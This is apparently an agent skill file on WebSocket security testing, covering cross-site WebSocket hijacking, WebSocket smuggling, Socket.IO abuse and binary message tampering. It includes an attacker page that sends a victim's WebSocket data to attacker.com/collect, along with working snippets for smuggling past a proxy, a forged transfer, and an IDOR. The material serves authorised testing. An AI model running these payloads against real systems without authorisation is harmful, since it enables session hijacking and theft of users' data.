---
name: websocket-security
description: >-
  WebSocket handshake, CSWSH, tooling (wsrepl, ws-harness, Burp), and common flaws. Use when apps use real-time channels, chat, notifications, or WS-backed APIs.
---

# SKILL: WebSocket Security

## 0. RELATED ROUTING

- [api-sec](../api-sec/SKILL.md) for REST/GraphQL companion testing

---

## 1. PROTOCOL BASICS

```http
# Client request:
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

# Server success:
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

---

## 2. CROSS-SITE WEBSOCKET HIJACKING (CSWSH)

### Condition

- Server does **not validate `Origin`** on WS handshake
- Victim has active session (cookie-based)

### Step 1: Confirm no Origin check

```text
# In Burp: intercept WebSocket upgrade request
# Change Origin: https://attacker.com
# If 101 returned → no Origin validation
```

### Step 2: Craft attacker page

```html
<script>
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
    ws.send(JSON.stringify({action: 'get_profile'}));
};
ws.onmessage = (event) => {
    fetch('https://attacker.com/collect', {
        method: 'POST', body: event.data
    });
};
</script>
```

### Cookie SameSite notes

```text
SameSite=None   → cookies sent in WebSocket upgrade (vulnerable)
SameSite=Lax    → NOT sent (WebSocket is not top-level navigation)
SameSite=Strict → NOT sent
Legacy (no SameSite) → behavior varies by browser version
```

---

## 3. TOOLING

```bash
# wsrepl
pip install wsrepl
wsrepl -u wss://target.example.com/ws -P auth_plugin.py

# ws-harness (bridge WS to HTTP for sqlmap etc.)
python ws-harness.py -u "ws://127.0.0.1:8765/path" -m ./message.txt
sqlmap -u "http://127.0.0.1:8000/?fuzz=test" --batch

# Burp: SocketSleuth (inspect/modify), WebSocket Turbo Intruder (fuzz)
```

---

## 4. COMMON VULNERABILITIES

| Issue | Why it matters |
|-------|----------------|
| Missing `Origin` validation | Enables CSWSH |
| Auth token in URL `wss://host/ws?token=...` | Logs, Referer leakage |
| No rate limiting | Abuse, DoS |
| `ws://` instead of `wss://` | Cleartext MITM |
| Injection in message bodies | SQLi, XSS if stored/reflected |

---

## 5. WEBSOCKET SMUGGLING

```text
1. Reverse proxy restricts /admin → 403
2. Client sends WS upgrade to /ws → proxy allows 101
3. After upgrade, proxy stops inspecting (raw TCP passthrough)
4. Client sends raw HTTP: GET /admin HTTP/1.1 Host: backend
5. Backend processes → 200 with admin content
```

```python
import websocket, ssl
ws = websocket.create_connection('wss://target.com/ws',
    header=['Origin: https://target.com'],
    sslopt={"cert_reqs": ssl.CERT_NONE})
# After upgrade, send raw HTTP through tunnel
ws.send(b"GET /admin HTTP/1.1\r\nHost: internal\r\nConnection: close\r\n\r\n", opcode=0x2)
print(ws.recv())
```

---

## 6. SOCKET.IO SPECIFIC

```javascript
// Namespace injection: connect to privileged namespace without auth
const adminSocket = io('https://target.com/admin');

// Event name injection if names derived from user input:
socket.emit('__disconnect');  // force disconnect others
socket.emit('connection');    // re-trigger connection handler

// Polling fallback CSRF (HTTP long-polling with cookies):
POST /socket.io/?EIO=4&transport=polling&sid=SESSION_ID
4{"type":2,"data":["transfer",{"to":"attacker","amount":1000}]}
```

---

## 7. BINARY MESSAGE MANIPULATION

```bash
# Decode protobuf binary frame:
echo "CAPTURED_HEX" | xxd -r -p | protoc --decode_raw
```

```python
import msgpack, websocket
ws = websocket.create_connection('wss://target.com/ws')
data = msgpack.unpackb(ws.recv(), raw=False)
data['user_id'] = 1  # IDOR: access admin's data
ws.send(msgpack.packb(data), opcode=0x2)
```

---

## 8. DECISION TREE

1. **Identify endpoint** — filter for `101` responses; note `wss` vs `ws`
2. **Handshake review** — Origin, Host, Cookie policies; token in query string?
3. **Session binding** — reconnect with another user's cookie jar
4. **CSWSH** — load local HTML that connects to target with victim session
5. **Message semantics** — fuzz JSON/text/binary payloads for injection
6. **Transport** — flag `ws://` in production; verify TLS
